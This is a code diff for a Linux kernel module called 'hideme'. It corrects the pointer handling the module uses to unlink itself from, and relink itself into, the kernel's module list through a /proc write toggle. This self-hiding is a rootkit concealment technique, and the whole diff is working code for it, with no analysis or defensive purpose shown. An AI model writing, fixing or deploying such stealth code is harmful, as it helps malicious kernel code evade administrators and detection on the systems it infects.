@@ -42,7 +42,6 @@ static ssize_t hideme_proc_read(struct file *file, char __user *ubuf, size_t siz
 
 static ssize_t hideme_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) {
 	char buf[128];
-	struct list_head module_list;
 
 	if (*offset != 0 || size > 128)
 		return -EFAULT;
@@ -51,12 +50,12 @@ static ssize_t hideme_proc_write(struct file *file, const char __user *ubuf, siz
 		return -EFAULT;
 
 	if (is_hide) {
-		THIS_MODULE->list->prev->next = THIS_MODULE->list;
-		THIS_MODULE->list->next->prev = THIS_MODULE->list;
+		(&THIS_MODULE->list)->prev->next = &THIS_MODULE->list;
+		(&THIS_MODULE->list)->next->prev = &THIS_MODULE->list;
 	}
 	else {
-		THIS_MODULE->list->prev->next = THIS_MODULE->list->next;
-		THIS_MODULE->list->next->prev = THIS_MODULE->list->prev;
+		(&THIS_MODULE->list)->prev->next = (&THIS_MODULE->list)->next;
+		(&THIS_MODULE->list)->next->prev = (&THIS_MODULE->list)->prev;
 	}
 
 	is_hide = !is_hide;
@@ -80,8 +79,8 @@ static int __init hideme_init(void) {
 
 static void __exit hideme_exit(void) {
 	if (is_hide) {
-		THIS_MODULE->list->prev->next = THIS_MODULE->list;
-		THIS_MODULE->list->next->prev = THIS_MODULE->list;
+		(&THIS_MODULE->list)->prev->next = &THIS_MODULE->list;
+		(&THIS_MODULE->list)->next->prev = &THIS_MODULE->list;
 	}
 
 	remove_proc_entry("hideme", NULL);
